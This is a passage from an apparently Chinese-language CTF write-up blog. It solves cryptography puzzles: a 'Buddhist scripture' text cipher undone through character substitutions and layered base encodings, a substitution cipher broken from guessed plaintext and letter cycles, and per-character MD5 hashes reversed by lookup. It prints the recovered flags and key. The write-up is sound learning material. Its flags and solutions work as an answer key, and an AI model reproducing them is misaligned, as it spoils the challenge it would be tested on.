                                <span class="n">zhelaosu</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">res</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">possible_res_3</span><span class="p">]</span>
                                <span class="c1"># rl = []
</span>                                <span class="c1"># for i in range(1, len(possible_res_3)):
</span>                                <span class="c1">#     rl.append(possible_res_3[i][0])
</span>                                <span class="c1"># replace_list.append((res[:], rl))
</span>
<span class="c1"># print(len(replace_list))
</span><span class="k">print</span><span class="p">(</span><span class="s">"="</span> <span class="o">*</span> <span class="mi">100</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">zhelaosu</span><span class="p">)</span>
</code></pre></div></div>

<p>这一坨代码奇丑无比，并且我用了很长很长时间来调试，依靠 assert 来勉强确保结果正确。大概从注释就能看出我写的时候是个什么心理状态了。</p>

<p>最后输出一大坨「佛经」，以及可以替换的序列：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="mi">299</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">381</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">754</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">819</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">998</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'老'</span><span class="p">],</span> <span class="mi">1670</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'老'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">2418</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">2518</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">2817</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">4770</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">5152</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">5527</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">6055</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">6687</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">7547</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'老'</span><span class="p">],</span> <span class="mi">7991</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">8320</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">9934</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">10113</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">11583</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">12075</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">12479</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">12620</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">12926</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'老'</span><span class="p">],</span> <span class="mi">13454</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">15128</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">15735</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">16028</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'老'</span><span class="p">],</span> <span class="mi">16041</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">17321</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">18187</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'老'</span><span class="p">],</span> <span class="mi">18320</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">18403</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">18764</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">18882</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">19224</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">19242</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">19260</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">19920</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">19970</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">20176</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">20179</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">20207</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">20236</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'老'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">20269</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">22196</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">22503</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">22641</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">23483</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">24224</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">24451</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">24520</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">25330</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">25917</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">26555</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">],</span> <span class="mi">27433</span><span class="p">:</span> <span class="p">[</span><span class="s">'者'</span><span class="p">,</span> <span class="s">'蘇'</span><span class="p">]}</span>
</code></pre></div></div>

<p>直接把「佛经」丢进去，会发现 UTF-16 解码错误。在 <code class="language-plaintext highlighter-rouge">Decrypt()</code> 里面加上 <code class="language-plaintext highlighter-rouge">print(result.decode('utf-16le', errors='ignore')[起始范围:结束范围]</code> 有助于观察输出的结果。</p>

<p>可以注意到，替换表里开头几个字符如果替换了，乱码会变成正确的结果，所以一个一个试一下就行，需要花一些时间。结果如下：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">keys</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">mappings</span><span class="p">.</span><span class="n">keys</span><span class="p">()))</span>
<span class="c1"># print(keys)
</span>
<span class="k">def</span> <span class="nf">replace</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">idx</span><span class="p">,</span> <span class="n">midx</span><span class="p">):</span>
   <span class="n">kidx</span> <span class="o">=</span> <span class="n">keys</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span>
   <span class="k">return</span> <span class="n">text</span><span class="p">[:</span><span class="n">kidx</span><span class="p">]</span> <span class="o">+</span> <span class="n">mappings</span><span class="p">[</span><span class="n">kidx</span><span class="p">][</span><span class="n">midx</span><span class="p">]</span> <span class="o">+</span> <span class="n">text</span><span class="p">[</span><span class="n">kidx</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:]</span>

<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">29</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">39</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">41</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">44</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">fo2</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">fo2</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">Decrypt</span><span class="p">(</span><span class="n">fo2</span><span class="p">))</span>
</code></pre></div></div>

<p>之后还要处理十层的 encoding，这个简直是小菜一碟：</p>

<ul>
  <li>b85 和 a85 字符集不同，试一试就知道</li>
  <li>b64 大家见得多了，特征挺明显的</li>
  <li>b32 只有大写字母</li>
  <li>b16 就是十六进制编码</li>
</ul>

<p>结果如下：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">a85decode</span><span class="p">(</span><span class="n">b64decode</span><span class="p">(</span><span class="n">a85decode</span><span class="p">(</span><span class="n">b64decode</span><span class="p">(</span><span class="n">a85decode</span><span class="p">(</span><span class="n">b16decode</span><span class="p">(</span><span class="n">b85decode</span><span class="p">(</span><span class="n">a85decode</span><span class="p">(</span><span class="n">b32decode</span><span class="p">(</span><span class="n">x</span><span class="p">)))))))))).</span><span class="n">decode</span><span class="p">()</span>
<span class="s">'将需要打码的文字输入在上面的文本框里，点击『听佛说宇宙的真谛』按钮，就能在下面得到打码后的文字。</span><span class="se">\r\n</span><span class="s">flag{AES_1s_b10ck_cipher}</span><span class="se">\r\n</span><span class="s">将需要解码的文字输入在下面的文本框里，记得带上『佛曰：』或『如是我闻：』的文字，点击『参悟佛所言的真意』按钮，就能在上面的文本框里得到解码后的文字。'</span>
</code></pre></div></div>

<p>虽然我的做法和 AES 没啥直接关系。</p>

<h2 id="奇怪的加密">奇怪的加密</h2>

<h3 id="flag-1密码学小作文">Flag 1：密码学小作文</h3>

<p>用了我整整一个下午的时间。</p>

<p>大概的思路是：这个算法只会加密字母，不会加密其他的字符，所以可以从文中的数字（年份）推断这大概是一篇关于密码学的小作文，从而可以推断出一部分的明文。在已知足够多明文的情况下，是可以推出来的。</p>

<p>并且这种替换算法还有一个数学上的性质：用户给的 key 将二十六个字母分割为了多个<strong>循环群</strong>。一个字母无论怎么变，只会变成它的循环群内的字母。</p>

<p>我的实际操作是，比如说开头 <code class="language-plaintext highlighter-rouge">Cinqwmzewtxs kn f</code>，八九不离十是 <code class="language-plaintext highlighter-rouge">Cryptography is a</code>（第一个字母无论如何不会被转换），所以我们可以画出：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>R-&gt;I
Y-&gt;?-&gt;N
P-&gt;?-&gt;?-&gt;Q
T-&gt;?-&gt;?-&gt;?-&gt;W
O-&gt;?-&gt;?-&gt;?-&gt;?-&gt;M
G-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;Z
R-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;E
A-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;W
P-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;T
H-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;X
Y-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;S
I-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;K
S-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;N
A-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;F
</code></pre></div></div>

<p>可以化简为</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>O-&gt;?-&gt;?-&gt;?-&gt;?-&gt;M
G-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;Z
P-&gt;?-&gt;?-&gt;Q-&gt;?-&gt;A-&gt;?-&gt;?-&gt;?-&gt;T-&gt;?-&gt;?-&gt;?-&gt;W-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;F
H-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;X
R-&gt;I-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;E-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;K
Y-&gt;?-&gt;N-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;S-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;Y
</code></pre></div></div>

<p>至少可以知道字母表中有一个长度为 22 的循环群。然后后面再找（猜）点明文数据往里面加。因为不停出错，我用了好几个小时。因为我不想再在写 wp 的时候重演当时的痛苦，所以我只把我最后的草稿贴出来：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>D-&gt;D

"Crypto"
# R-&gt;I
Y-&gt;?-&gt;N
# P-&gt;?-&gt;?-&gt;Q
T-&gt;?-&gt;?-&gt;?-&gt;W
O-&gt;?-&gt;?-&gt;?-&gt;?-&gt;M

+"graphy"?
# G-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;Z
G-&gt;R-&gt;I-&gt;?-&gt;?-&gt;?-&gt;Z-&gt;?-&gt;E-&gt;?-&gt;?-&gt;?-&gt;P-&gt;C-&gt;?-&gt;Q-&gt;H-&gt;A-&gt;Y-&gt;B-&gt;?-&gt;T-&gt;?-&gt;?-&gt;?-&gt;W-&gt;X
? G-&gt;R-&gt;I-&gt;W-&gt;X-&gt;?-&gt;Z-&gt;?-&gt;E-&gt;?-&gt;?-&gt;?-&gt;P-&gt;C-&gt;?-&gt;Q-&gt;H-&gt;A-&gt;Y-&gt;B-&gt;N-&gt;T-&gt;G
? G-&gt;R-&gt;I-&gt;W-&gt;X-&gt;O-&gt;Z-&gt;S-&gt;E-&gt;F-&gt;M-&gt;?-&gt;P-&gt;C-&gt;?-&gt;Q-&gt;H-&gt;A-&gt;Y-&gt;B-&gt;N-&gt;T-&gt;G
? G-&gt;R-&gt;I-&gt;W-&gt;X-&gt;O-&gt;Z-&gt;S-&gt;E-&gt;F-&gt;M-&gt;L-&gt;P-&gt;C-&gt;?-&gt;Q-&gt;H-&gt;A-&gt;Y-&gt;B-&gt;N-&gt;T-&gt;G
# A-&gt;?-&gt;?-&gt;?-&gt;T-&gt;?-&gt;?-&gt;?-&gt;W
# P-&gt;C-&gt;?-&gt;Q-&gt;H-&gt;A-&gt;?-&gt;B-&gt;?-&gt;T-&gt;?-&gt;?-&gt;?-&gt;W-&gt;X
# H-&gt;A-&gt;?-&gt;B-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;X
Y-&gt;?-&gt;N-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;S

"a"
A-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;F

"Friedrich Kasiski"
R-&gt;I-&gt;?-&gt;?-&gt;?-&gt;Z-&gt;?-&gt;?-&gt;?-&gt;?-&gt;?-&gt;P-&gt;C-&gt;?-&gt;Q

"cipher"
# P-&gt;C
H-&gt;?-&gt;Y
? E-&gt;?-&gt;?-&gt;L
? O-&gt;?-&gt;?-&gt;?-&gt;R

"ChaCha20"
H-&gt;A-&gt;?-&gt;B
</code></pre></div></div>

<p>最后的 key 为 <code class="language-plaintext highlighter-rouge">YNKDFMRAWUQPLTZCHIEGJVXOBS</code>。</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;</span><span class="w"> </span>python dec.py crypt1.txt YNKDFMRAWUQPLTZCHIEGJVXOBS | <span class="nb">grep </span>flag
<span class="go">The Rail Fence or Zigzag Cipher is a transposition cipher. We must first choose a numeric key, which we use to encipher our plaintext message. Once we have a key, say 3, we write each letter of the plaintext diagonally downwards as many rows as the key, and then continue upwards until the top row and then go down again - like a zigzag! The ciphertext is then assembled by collecting all letters on each line together and then placing each line after each other. The flag is foxtrot lima alpha golf left bracket foxtrot romeo echo nine uniform echo november charlie yankee underscore four november alpha lima yankee five india sierra underscore one sierra underscore uniform sierra echo foxtrot uniform lima right bracket.
</span></code></pre></div></div>

<p>dec.py 照着题目源代码改就行。flag 就是最后一句话，自己手动看一下就行。</p>

<p>这篇文章我没有在互联网上找到原文。</p>

<h3 id="flag-2md5-小作文">Flag 2：MD5 小作文</h3>

<p>发现有很多数字，每行长度一样，想了一下，似乎和熟知的编码都不匹配，但是看起来有点像 MD5，试了一下：</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'T'</span> | <span class="nb">md5sum</span>
<span class="go">b9ece18c950afbfa6b0fdbfa4ff731d3
</span></code></pre></div></div>

<p>这坨东西和第一行的数字是匹配的，因此就是 MD5 了，写了个脚本：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">string</span>
<span class="kn">import</span> <span class="nn">hashlib</span>

<span class="n">printable</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">printable</span>

<span class="n">mappings</span> <span class="o">=</span> <span class="p">{}</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">printable</span><span class="p">:</span>
    <span class="n">digest</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">hexdigest</span><span class="p">()</span>
    <span class="n">mappings</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">digest</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">printable</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">printable</span><span class="p">:</span>
        <span class="n">digest</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">((</span><span class="n">i</span> <span class="o">+</span> <span class="n">j</span><span class="p">).</span><span class="n">encode</span><span class="p">()).</span><span class="n">hexdigest</span><span class="p">()</span>
        <span class="n">mappings</span><span class="p">[(</span><span class="n">i</span><span class="o">+</span><span class="n">j</span><span class="p">)]</span> <span class="o">=</span> <span class="n">digest</span>

<span class="k">def</span> <span class="nf">get_numeric_chars</span><span class="p">(</span><span class="n">s</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">filter</span><span class="p">(</span><span class="nb">str</span><span class="p">.</span><span class="n">isdigit</span><span class="p">,</span> <span class="n">s</span><span class="p">))</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"crypt2.txt"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">l</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">mappings</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">get_numeric_chars</span><span class="p">(</span><span class="n">mappings</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">==</span> <span class="n">get_numeric_chars</span><span class="p">(</span><span class="n">l</span><span class="p">):</span>
                <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">""</span><span class="p">)</span>
                <span class="k">break</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"?"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
</code></pre></div></div>

<p>结果为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The MD5 message-digest algorithm is a cryptographically broken?t ??widely used hash function p?ucing ?28-b??h value.?ag{md5_1s_re41ly_1n5ecur3} Althoug?D5 was?????gned to be u???crypto?phic h??nction,???een found? suffer from extensive vulnerabil?s.
